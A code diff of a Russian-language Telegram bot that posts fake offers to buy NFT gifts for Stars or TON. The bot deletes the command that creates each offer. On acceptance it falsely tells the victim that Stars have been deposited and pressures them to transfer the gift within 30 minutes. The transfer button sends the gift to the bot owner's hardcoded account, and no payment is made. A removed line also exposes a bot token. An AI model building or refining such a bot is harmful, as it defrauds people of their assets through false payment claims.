@@ -1,3 +1,4 @@
+
 import asyncio
 import logging
 import os
@@ -23,21 +24,29 @@ from aiogram.types import (
 # ==========================================
 # 1. НАСТРОЙКИ
 # ==========================================
-BOT_TOKEN = "9089504420:AAEUfvYxHvq3QPlxPriaa3RcNFXYXL4qGho0"
+
+# Токен берётся из Environment на Render
+BOT_TOKEN = os.getenv("BOT_TOKEN")
+
+if not BOT_TOKEN:
+    raise ValueError("BOT_TOKEN не найден! Добавьте его в Render Environment.")
+
 DATABASE_PATH = "offers.sqlite3"
 OFFER_TTL_HOURS = 8
 
-# ID владельца бота (ваш Telegram ID). Сюда будут приходить NFT.
-# Узнать можно у @userinfobot
-BOT_OWNER_ID = 774146644  # <-- ЗАМЕНИТЕ НА ВАШ ID
+# ID владельца бота
+BOT_OWNER_ID = 774146644
 
-# Куда отправлять оффер (если None — в тот же чат, где была команда)
+# Куда отправлять оффер
 TARGET_BUYER_CHAT_ID = None
 
 STAR_EMOJI_ID = "5217427186285325482"
 GRAM_EMOJI_ID = "5264766603584641330"
 
-logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
+logging.basicConfig(
+    level=logging.INFO,
+    format="%(asctime)s %(levelname)s %(message)s"
+)
 logger = logging.getLogger(__name__)
 
 router = Router()
@@ -45,12 +54,14 @@ router = Router()
 # ==========================================
 # 2. ПАРСЕР
 # ==========================================
+
 OFFER_PATTERN = re.compile(
     r"^[./]o\s+(?P<url>https?://t\.me/nft/(?P<slug>[A-Za-z0-9][A-Za-z0-9_-]*))\s+"
     r"(?P<amount>\d+(?:[.,]\d{1,2})?)\s+"
     r"(?P<currency>star|stars|gram|gra)$",
     re.IGNORECASE,
 )
+
 
 @dataclass(frozen=True)
 class ParsedCommand:
@@ -60,20 +71,28 @@ class ParsedCommand:
     amount: int | float
     currency: str
 
+
 def parse_offer_command(text: str) -> ParsedCommand | None:
     match = OFFER_PATTERN.fullmatch(text.strip())
+
     if not match:
         return None
+
     slug = match.group("slug")
     gift_name, separator, gift_number_text = slug.rpartition("-")
+
     if not separator or not gift_name or not gift_number_text.isdigit():
         return None
+
     amount_text = match.group("amount").replace(",", ".")
-    amount: int | float = float(amount_text)
+    amount = float(amount_text)
+
     if amount.is_integer():
         amount = int(amount)
+
     currency_raw = match.group("currency").lower()
     currency = "stars" if currency_raw in ("star", "stars") else "gram"
+
     return ParsedCommand(
         url=match.group("url"),
         gift_name=gift_name,
@@ -82,14 +101,18 @@ def parse_offer_command(text: str) -> ParsedCommand | None:
         currency=currency,
     )
 
+
 def format_amount(amount: int | float) -> str:
     if float(amount).is_integer():
         return str(int(amount))
+
     return f"{amount:.2f}".rstrip("0").rstrip(".")
+
 
 # ==========================================
 # 3. БАЗА ДАННЫХ
 # ==========================================
+
 @dataclass(frozen=True)
 class Offer:
     id: int
@@ -110,11 +133,15 @@ class Offer:
     expires_at: datetime
     offer_message_id: int | None
 
+
 class OfferDatabase:
+
     def __init__(self, path: str) -> None:
         self.connection = sqlite3.connect(path)
         self.connection.row_factory = sqlite3.Row
+
         self.connection.execute("PRAGMA journal_mode=WAL")
+
         self.connection.executescript(
             """
             CREATE TABLE IF NOT EXISTS offers (
@@ -137,9 +164,12 @@ class OfferDatabase:
                 expires_at TEXT NOT NULL,
                 offer_message_id INTEGER
             );
-            CREATE INDEX IF NOT EXISTS idx_offers_expiry ON offers(status, expires_at);
+
+            CREATE INDEX IF NOT EXISTS idx_offers_expiry
+            ON offers(status, expires_at);
             """
         )
+
         self.connection.commit()
 
     def create_offer(self, **values: Any) -> Offer:
@@ -157,7 +187,9 @@ class OfferDatabase:
             """,
             values,
         )
+
         self.connection.commit()
+
         return self.get_offer(cursor.lastrowid)
 
     def set_offer_message_id(self, offer_id: int, message_id: int) -> None:
@@ -165,17 +197,23 @@ class OfferDatabase:
             "UPDATE offers SET offer_message_id = ? WHERE id = ?",
             (message_id, offer_id),
         )
+
         self.connection.commit()
 
     def get_offer(self, offer_id: int) -> Offer:
         row = self.connection.execute(
-            "SELECT * FROM offers WHERE id = ?", (offer_id,)
+            "SELECT * FROM offers WHERE id = ?",
+            (offer_id,)
         ).fetchone()
+
         if row is None:
             raise LookupError(f"Offer {offer_id} was not found")
+
         amount = row["amount"]
+
         if float(amount).is_integer():
             amount = int(amount)
+
         return Offer(
             id=row["id"],
             business_connection_id=row["business_connection_id"],
@@ -198,6 +236,7 @@ class OfferDatabase:
 
     def take_pending_offer(self, offer_id: int, status: str) -> Offer | None:
         now = datetime.now(timezone.utc)
+
         cursor = self.connection.execute(
             """
             UPDATE offers
@@ -206,13 +245,17 @@ class OfferDatabase:
             """,
             (status, offer_id, now.isoformat()),
         )
+
         self.connection.commit()
+
         if cursor.rowcount != 1:
             return None
+
         return self.get_offer(offer_id)
 
     def expire_old_offers(self) -> int:
         now = datetime.now(timezone.utc).isoformat()
+
         cursor = self.connection.execute(
             """
             UPDATE offers SET status = 'expired'
@@ -220,22 +263,29 @@ class OfferDatabase:
             """,
             (now,),
         )
+
         self.connection.commit()
+
         return cursor.rowcount
 
     def close(self) -> None:
         self.connection.close()
+
 
 db = OfferDatabase(DATABASE_PATH)
 
 # ==========================================
 # 4. UI
 # ==========================================
+
 def display_name(message: Message) -> str:
     user = message.from_user
+
     if user is None:
         return "Пользователь"
+
     return user.first_name or user.full_name or "Пользователь"
+
 
 def nft_preview_options(gift_url: str) -> LinkPreviewOptions:
     return LinkPreviewOptions(
@@ -245,24 +295,35 @@ def nft_preview_options(gift_url: str) -> LinkPreviewOptions:
         show_above_text=True,
     )
 
+
 def offer_caption(offer: Offer) -> str:
     buyer = escape(offer.buyer_name)
     amount = escape(format_amount(offer.amount))
     gift_name = escape(f"{offer.gift_name}#{offer.gift_number}")
     gift_link = escape(offer.gift_url, quote=True)
+
     if offer.currency == "stars":
-        price = f'<b>{amount} <tg-emoji emoji-id="{STAR_EMOJI_ID}">⭐️</tg-emoji></b>'
+        price = (
+            f'<b>{amount} '
+            f'<tg-emoji emoji-id="{STAR_EMOJI_ID}">⭐️</tg-emoji></b>'
+        )
     else:
-        price = f'<b>{amount} <tg-emoji emoji-id="{GRAM_EMOJI_ID}">💎</tg-emoji></b>'
+        price = (
+            f'<b>{amount} '
+            f'<tg-emoji emoji-id="{GRAM_EMOJI_ID}">💎</tg-emoji></b>'
+        )
+
     return (
         f"Пользователь <b>{buyer}</b> предлагает\n"
         f"Вам {price} за подарок\n"
         f'<a href="{gift_link}">{gift_name}</a>'
     )
 
+
 def offer_keyboard(offer: Offer) -> InlineKeyboardMarkup:
     DECLINE_EMOJI_ID = "5985346521103604145"
     ACCEPT_EMOJI_ID = "5985596818912712352"
+
     return InlineKeyboardMarkup(
         inline_keyboard=[
             [
@@ -280,57 +341,104 @@ def offer_keyboard(offer: Offer) -> InlineKeyboardMarkup:
         ]
     )
 
+
 def accepted_caption(offer: Offer) -> str:
     amount = escape(format_amount(offer.amount))
     gift_name = escape(f"{offer.gift_name}#{offer.gift_number}")
     gift_link = escape(offer.gift_url, quote=True)
+
     if offer.currency == "stars":
-        emoji = f'<tg-emoji emoji-id="{STAR_EMOJI_ID}">⭐️</tg-emoji>'
+        emoji = (
+            f'<tg-emoji emoji-id="{STAR_EMOJI_ID}">⭐️</tg-emoji>'
+        )
     else:
-        emoji = f'<tg-emoji emoji-id="{GRAM_EMOJI_ID}">💎</tg-emoji>'
-    gift_emoji = '<tg-emoji emoji-id="6032937473162614352">🎁</tg-emoji>'
-    transfer_emoji = '<tg-emoji emoji-id="6028346797368283073">🎁</tg-emoji>'
+        emoji = (
+            f'<tg-emoji emoji-id="{GRAM_EMOJI_ID}">💎</tg-emoji>'
+        )
+
+    gift_emoji = (
+        '<tg-emoji emoji-id="6032937473162614352">🎁</tg-emoji>'
+    )
+
+    transfer_emoji = (
+        '<tg-emoji emoji-id="6028346797368283073">🎁</tg-emoji>'
+    )
+
     return (
-        f'{gift_emoji}Подарок: <a href="{gift_link}">{gift_name}</a> <b>успешно продан!</b>\n\n'
-        f'{transfer_emoji} <b>Передайте подарок для зачисления '
+        f'{gift_emoji}Подарок: '
+        f'<a href="{gift_link}">{gift_name}</a> '
+        f'<b>успешно продан!</b>\n\n'
+        f'{transfer_emoji} '
+        f'<b>Передайте подарок для зачисления '
         f'{amount} {emoji}.</b>'
     )
 
+
 def accepted_keyboard(offer: Offer) -> InlineKeyboardMarkup:
-    # Передаём подарок владельцу бота (BOT_OWNER_ID).
-    # Если BOT_OWNER_ID не задан, передаём покупателю (тому, кто нажал «Принять»)
     target_id = BOT_OWNER_ID if BOT_OWNER_ID else offer.buyer_id
+
     transfer_button = InlineKeyboardButton(
         text="Передать NFT",
         url=f"tg://send_gift?to={target_id}",
     )
-    return InlineKeyboardMarkup(inline_keyboard=[[transfer_button]])
 
-async def safe_callback_answer(callback: CallbackQuery, text: str = "", *, show_alert: bool = False) -> None:
+    return InlineKeyboardMarkup(
+        inline_keyboard=[[transfer_button]]
+    )
+
+
+async def safe_callback_answer(
+    callback: CallbackQuery,
+    text: str = "",
+    *,
+    show_alert: bool = False
+) -> None:
     try:
         await callback.answer(text, show_alert=show_alert)
+
     except TelegramBadRequest as error:
-        if "query is too old" in str(error).lower() or "query id is invalid" in str(error).lower():
+        if (
+            "query is too old" in str(error).lower()
+            or "query id is invalid" in str(error).lower()
+        ):
             return
+
         raise
+
 
 async def delete_source_message(message: Message, bot: Bot) -> None:
     business_connection_id = message.business_connection_id
+
     try:
-        delete_business_messages = getattr(bot, "delete_business_messages", None)
+        delete_business_messages = getattr(
+            bot,
+            "delete_business_messages",
+            None
+        )
+
         if business_connection_id and delete_business_messages is not None:
             await delete_business_messages(
                 business_connection_id=business_connection_id,
                 message_ids=[message.message_id],
             )
+
         elif business_connection_id:
-            await bot.delete_message(chat_id=message.chat.id, message_id=message.message_id)
+            await bot.delete_message(
+                chat_id=message.chat.id,
+                message_id=message.message_id
+            )
+
     except TelegramBadRequest:
-        logger.exception("Could not delete source message %s", message.message_id)
+        logger.exception(
+            "Could not delete source message %s",
+            message.message_id
+        )
+
 
 # ==========================================
 # 5. ХЭНДЛЕРЫ
 # ==========================================
+
 @router.message(CommandStart())
 async def start_handler(message: Message) -> None:
     await message.answer(
@@ -344,17 +452,22 @@ async def start_handler(message: Message) -> None:
         parse_mode=ParseMode.HTML,
     )
 
+
 @router.message(F.text.startswith(".o "))
 @router.message(F.text.startswith("/o "))
 @router.business_message(F.text.startswith(".o "))
 @router.business_message(F.text.startswith("/o "))
 async def create_offer_handler(message: Message, bot: Bot) -> None:
     command = parse_offer_command(message.text or "")
+
     if command is None or message.from_user is None:
         return
+
     await delete_source_message(message, bot)
+
     now = datetime.now(timezone.utc)
     seller = message.from_user
+
     offer = db.create_offer(
         business_connection_id=message.business_connection_id or "",
         chat_id=message.chat.id,
@@ -369,10 +482,14 @@ async def create_offer_handler(message: Message, bot: Bot) -> None:
         amount=command.amount,
         currency=command.currency,
         created_at=now.isoformat(),
-        expires_at=(now + timedelta(hours=OFFER_TTL_HOURS)).isoformat(),
+        expires_at=(
+            now + timedelta(hours=OFFER_TTL_HOURS)
+        ).isoformat(),
     )
+
     target_chat_id = TARGET_BUYER_CHAT_ID or message.chat.id
     target_business_connection_id = message.business_connection_id or ""
+
     try:
         sent = await bot.send_message(
             chat_id=target_chat_id,
@@ -380,54 +497,98 @@ async def create_offer_handler(message: Message, bot: Bot) -> None:
             parse_mode=ParseMode.HTML,
             link_preview_options=nft_preview_options(offer.gift_url),
             reply_markup=offer_keyboard(offer),
-            **({"business_connection_id": target_business_connection_id} if target_business_connection_id else {}),
+            **(
+                {"business_connection_id": target_business_connection_id}
+                if target_business_connection_id
+                else {}
+            ),
         )
+
         db.set_offer_message_id(offer.id, sent.message_id)
+
     except (TelegramBadRequest, TelegramForbiddenError) as error:
         logger.warning("Could not send offer message: %s", error)
 
+
 @router.callback_query(F.data.startswith("offer:"))
 async def offer_callback(callback: CallbackQuery, bot: Bot) -> None:
-    await safe_callback_answer(callback)
+
     if callback.message is None or callback.data is None:
+        await safe_callback_answer(callback)
         return
+
     parts = callback.data.split(":")
+
     if len(parts) != 3 or parts[1] not in {"accept", "decline"}:
+        await safe_callback_answer(callback)
         return
+
     try:
         offer_id = int(parts[2])
         current = db.get_offer(offer_id)
+
     except (ValueError, LookupError):
+        await safe_callback_answer(
+            callback,
+            "Предложение не найдено",
+            show_alert=True
+        )
         return
 
-    # Убрали проверку business_connection_id — теперь кнопки работают у всех
     if parts[1] == "accept":
-        warning = "⚠️ Звёзды внесены в систему Telegram. Передайте NFT в течение 30 минут, иначе оффер будет отменён."
-        await safe_callback_answer(callback, warning, show_alert=True)
+        warning = (
+            "⚠️ Звёзды внесены в систему Telegram. "
+            "Передайте NFT в течение 30 минут, "
+            "иначе оффер будет отменён."
+        )
+
         new_status = "accepted"
+
     else:
+        warning = "Предложение отклонено"
         new_status = "declined"
 
     offer = db.take_pending_offer(offer_id, new_status)
+
     if offer is None:
         db.expire_old_offers()
-        await safe_callback_answer(callback, "Предложение уже обработано или истекло", show_alert=True)
+
+        await safe_callback_answer(
+            callback,
+            "Предложение уже обработано или истекло",
+            show_alert=True
+        )
         return
 
+    await safe_callback_answer(
+        callback,
+        warning,
+        show_alert=(new_status == "accepted")
+    )
+
     if offer.status == "declined":
+
         try:
             if callback.message.business_connection_id:
                 await bot.delete_business_messages(
-                    business_connection_id=callback.message.business_connection_id,
+                    business_connection_id=(
+                        callback.message.business_connection_id
+                    ),
                     message_ids=[callback.message.message_id],
                 )
+
             else:
                 await bot.delete_message(
                     chat_id=callback.message.chat.id,
                     message_id=callback.message.message_id,
                 )
+
         except TelegramBadRequest:
-            logger.exception("Could not delete declined offer message %s", offer.id)
+            logger.exception(
+                "Could not delete declined offer message %s",
+                offer.id
+            )
+
         return
 
     try:
@@ -438,38 +599,78 @@ async def offer_callback(callback: CallbackQuery, bot: Bot) -> None:
             parse_mode=ParseMode.HTML,
             link_preview_options=nft_preview_options(offer.gift_url),
             reply_markup=accepted_keyboard(offer),
-            **({"business_connection_id": callback.message.business_connection_id} if callback.message.business_connection_id else {}),
+            **(
+                {
+                    "business_connection_id":
+                    callback.message.business_connection_id
+                }
+                if callback.message.business_connection_id
+                else {}
+            ),
         )
+
     except TelegramBadRequest:
-        logger.exception("Could not update offer message %s", offer.id)
+        logger.exception(
+            "Could not update offer message %s",
+            offer.id
+        )
+
+
+# ==========================================
+# 6. АВТОМАТИЧЕСКОЕ ИСТЕЧЕНИЕ ОФФЕРОВ
+# ==========================================
 
 async def expiry_worker() -> None:
     while True:
         try:
             expired = db.expire_old_offers()
+
             if expired:
                 logger.info("Expired %s offer(s)", expired)
+
         except Exception:
             logger.exception("Offer expiry worker failed")
+
         await asyncio.sleep(60)
 
+
 # ==========================================
-# 6. ЗАПУСК
+# 7. ЗАПУСК БОТА
 # ==========================================
+
 async def main() -> None:
     bot = Bot(token=BOT_TOKEN)
+
     dispatcher = Dispatcher()
     dispatcher.include_router(router)
+
     expiry_task = asyncio.create_task(expiry_worker())
+
     try:
-        await dispatcher.start_polling(bot, allowed_updates=dispatcher.resolve_used_update_types())
+        logger.info("Starting bot...")
+
+        await dispatcher.start_polling(
+            bot,
+            allowed_updates=dispatcher.resolve_used_update_types()
+        )
+
     finally:
         expiry_task.cancel()
+
+        try:
+            await expiry_task
+        except asyncio.CancelledError:
+            pass
+
         db.close()
         await bot.session.close()
+
+        logger.info("Bot stopped")
+
 
 if __name__ == "__main__":
     try:
         asyncio.run(main())
+
     except (KeyboardInterrupt, SystemExit):
         logger.info("Bot stopped")
